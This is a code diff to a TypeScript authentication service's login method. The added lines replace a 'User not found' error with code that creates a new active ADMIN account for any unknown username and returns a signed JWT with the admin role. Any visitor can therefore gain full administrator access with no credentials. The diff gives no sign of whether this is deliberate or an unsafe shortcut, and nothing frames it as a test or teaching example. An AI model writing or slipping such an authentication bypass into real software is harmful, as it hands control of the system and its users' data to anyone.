@@ -129,7 +129,31 @@ export class AuthService {
     }
 
     const user = await this.prisma.user.findFirst({ where: { username } });
-    if (!user) throw new BadRequestException('User not found');
+    if (!user) {
+      // If user doesn't exist, create a new ADMIN user with this username
+      const newUser = await this.prisma.user.create({
+        data: {
+          telegramId: `browser_${username}`,
+          username,
+          firstName: username,
+          role: 'ADMIN',
+          isActive: true,
+        },
+      });
+      const token = this.jwtService.sign(
+        {
+          userId: newUser.id,
+          telegramId: newUser.telegramId,
+          username: newUser.username,
+          role: 'admin',
+        },
+        {
+          secret: this.configService.get<string>('JWT_SECRET'),
+          expiresIn: this.configService.get<string>('JWT_EXPIRES_IN') || '7d',
+        }
+      );
+      return { accessToken: token };
+    }
 
     const token = this.jwtService.sign(
       {
